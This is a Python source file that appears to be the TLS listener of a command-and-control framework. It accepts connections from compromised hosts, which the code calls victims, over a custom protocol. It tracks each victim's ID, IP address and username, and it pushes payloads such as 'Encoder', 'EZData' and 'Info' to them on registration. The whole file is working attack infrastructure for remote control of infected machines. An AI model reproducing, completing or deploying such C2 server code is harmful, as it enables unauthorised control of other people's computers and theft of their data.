import socket
import threading
import json
import time
import ssl
import logging
from datetime import datetime

from lib.C2P import C2P
from lib.Client import Client
from lib.ColorPrint import ColorPrint as cp
from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
from lib.Listener import Listener as mainListener
from lib.tool import EZData, EZClass
from lib.EZPayload import get_payload

class Listener:
    log = logging.getLogger(__name__ + '.Listener')
    log.setLevel(logging.NOTSET)

    def __init__(self, ip: str, port: int, main_listener: mainListener, certfile: str, pemfile: str):
        self.main_listener = main_listener

        self.ssl_certfile = 'cert.pem'
        self.ssl_keyfile = 'key.pem'
        
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
        self.context.load_cert_chain(certfile=self.ssl_certfile, keyfile=self.ssl_keyfile)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) # TCP
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        ip = '0.0.0.0' if ip == '*' else ip

        sock.bind((ip, port))

        self.sock = sock

        self.bListen = sock.fileno() != -1

        self.msg_handler = None

        '''
        Dictionary format:
            Key: ID
            Value: class Client
        '''

        self.dic_victim = {}

    def start(self):
        self.sock.listen(10000)

        while True:
            conn, addr = self.sock.accept()

            try:
                conn = self.context.wrap_socket(conn, server_side=True)
            except ssl.SSLError as ex:
                self.log.error(str(ex))
                continue

            self.log.debug(f'New TLS client: ({addr[0]}, {addr[1]})')

            t = threading.Thread(target=self.handler, args=[conn, addr])
            t.daemon = True
            t.start()

    def stop(self):
        try:
            self.sock.close()
            return True
        except Exception as ex:
            return False

    def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
        return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]
    
    def handler(self, clnt_sock: socket.socket, clnt_addr):
        abStaticRecv = b''
        abDynamicRecv = b''

        clnt = Client(clnt_sock)
        clnt.addr = clnt_addr
        clnt.type = 'TLS'

        try:
            while clnt_sock.fileno() != -1:
                abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                nRecv = len(abStaticRecv)

                abDynamicRecv = self.combine_bytes(abDynamicRecv, 0, len(abDynamicRecv), abStaticRecv, 0, nRecv)

                if not nRecv:
                    break
                elif len(abDynamicRecv) < C2P.HEADER_LENGTH:
                    continue
                else:
                    c2p = C2P(abBuffer=abDynamicRecv)
                    tp = c2p.get_header()
                    nLength = tp[2]

                    while len(abDynamicRecv) - C2P.HEADER_LENGTH >= nLength:
                        c2p = C2P(abBuffer=abDynamicRecv)
                        abDynamicRecv = c2p.more_data()

                        nCmd = c2p.nCmd
                        nParam = c2p.nParam
                        nLength = c2p.nLength

                        abMsg = c2p.get_msg()

                        if nCmd == 0:
                            if nParam == 0:
                                pass
                            elif nParam == 1:
                                pass

                        elif nCmd == 1:
                            if nParam == 0: # received hello handshake.
                                clnt.sendcommand(1, 1) # send acknowledgement.
                            elif nParam == 2:
                                clnt.sendcommand(2, 0) # received acknowledgement.

                        elif nCmd == 2:
                            szMsg = abMsg.decode('utf-8')
                            lsMsg = szMsg.split('|')

                            if nParam == 1:
                                self.dic_victim[clnt_addr] = EZClass.Victim(lsMsg[0], None, clnt)

                                # pre load payload
                                ls_preload = [
                                    'Encoder',
                                    'EZData',
                                ]
                                for szName in ls_preload:
                                    szPayload = get_payload(self.dic_victim[clnt_addr].szTag, szName)
                                    clnt.sendvictim(['*', szName, szPayload])

                                ls_send = [
                                    '*',
                                    'Info',
                                    get_payload(self.dic_victim[clnt_addr].szTag, 'Info'),
                                    'start',
                                ]

                                clnt.sendvictim(ls_send)
                            elif nParam == 3:
                                lsMsg = [Encoder.b64d2str(x) for x in lsMsg]
                                if lsMsg[1] == 'info' and lsMsg[2] == 'start':
                                    if clnt_addr in self.dic_victim.keys():
                                        obj_json = json.loads(lsMsg[3])

                                        obj_class = self.dic_victim[clnt_addr]
                                        
                                        if obj_json['ID'] in self.dic_victim.keys():
                                            clnt.close()
                                            break
                                        else:
                                            self.dic_victim[obj_json['ID']] = EZClass.Victim(obj_class.szTag, obj_json['ID'], clnt, obj_json['IP'], obj_json['Username'])
                                            self.dic_victim.pop(clnt_addr)
                                            clnt.VictimID = obj_json['ID']

                                self.msg_handler(self.main_listener, self, lsMsg[0], clnt, lsMsg[1:])
        
        except Exception as ex:
            self.log.error(str(ex))

        # disconnect
        self.log.debug(f'Victim offline: {clnt.VictimID}')
        if clnt.VictimID in self.dic_victim.keys():
            self.dic_victim.pop(clnt.VictimID)
            self.main_listener.boardcast_clnt(['disconnect', 'victim', clnt.VictimID])

    def get_victims(self) -> dict:
        return self.dic_victim
    
    def set_msg_handler(self, method: object):
        self.msg_handler = method